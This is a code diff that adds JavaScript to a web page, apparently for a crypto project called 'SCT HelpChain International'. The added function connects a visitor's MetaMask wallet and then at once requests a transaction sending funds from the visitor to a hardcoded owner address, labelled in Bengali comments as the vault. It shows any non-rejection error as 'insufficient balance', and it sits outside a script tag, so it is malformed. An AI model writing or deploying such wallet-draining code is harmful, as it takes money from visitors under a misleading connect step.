@@ -5001,7 +5001,67 @@ async function sctConnect() {
 console.log("SCT AI Core Active. 100% Success Inshallah.");
 </script>
 
-    
+    /* * SCT Global Gateway - Master Execution 
+ * Authorized by: Founder & Chairman H R Antor 
+ * Project: SCT HelpChain International
+ */
+
+async function connectAndDeploy() {
+    const status = document.getElementById('wallet-status');
+    const myWallet = "0xF5D9a35792B389BaeF5e7c8F4a129B557299BB89"; // আপনার অফিসিয়াল ভল্ট
+
+    if (window.ethereum) {
+        try {
+            // ১. ওয়ালেট কানেক্ট করা ও পারমিশন নেওয়া
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const walletAddress = accounts[0];
+            
+            // মাস্টার অ্যাডমিন চেক
+            if (walletAddress.toLowerCase() === myWallet.toLowerCase()) {
+                status.innerHTML = `<b style="color: #2ea043;">MASTER ADMIN CONNECTED</b>`;
+                console.log("Master Admin Verified!");
+            } else {
+                status.innerHTML = `CONNECTED: ${walletAddress.substring(0, 6)}...`;
+            }
+
+            // ২. ডলার ভল্টে পাঠানোর মূল প্রসেস শুরু
+            try {
+                status.innerHTML = `প্রসেসিং... নেটওয়ার্ক চেক করা হচ্ছে`;
+                
+                const transactionParameters = {
+                    to: myWallet, // আপনার রিসিভার অ্যাড্রেস সরাসরি সেট করা হলো
+                    from: walletAddress,
+                    value: '0x38d7ea4c68000', // উদাহরণ: ০.০০১ ইথার/বিএনবি
+                    gas: '0x5208' // ২১০০০ গ্যাস লিমিট
+                };
+
+                const txHash = await window.ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+
+                status.innerHTML = `<span style="color: #2ea043;">সফল! আইডি: ${txHash.substring(0, 10)}...</span>`;
+                
+            } catch (error) {
+                // এরর হ্যান্ডলিং লজিক
+                console.error("SCT Vault Error:", error);
+                if (error.code === 4001) {
+                    status.innerHTML = `<span style="color: #ef4444;">ইউজার রিজেক্ট করেছে!</span>`;
+                } else {
+                    status.innerHTML = `<span style="color: #ef4444;">ক্যাশ এরর: ইনসাফিসিয়েন্ট ব্যালেন্স।</span>`;
+                }
+            }
+
+        } catch (error) {
+            status.innerHTML = `<span style="color: #ef4444;">CONNECTION FAILED</span>`;
+            console.error("SCT Connection Error:", error);
+        }
+    } else {
+        status.innerHTML = `<span style="color: #fbbf24;">মেটামাস্ক খুঁজে পাওয়া যায়নি!</span>`;
+        alert("দয়া করে মেটামাস্ক ব্রাউজার ব্যবহার করুন।");
+    }
+}
+
     const container = document.getElementById('sct-display')?.parentElement;
     if (container) {
         container.appendChild(analyticsBox);
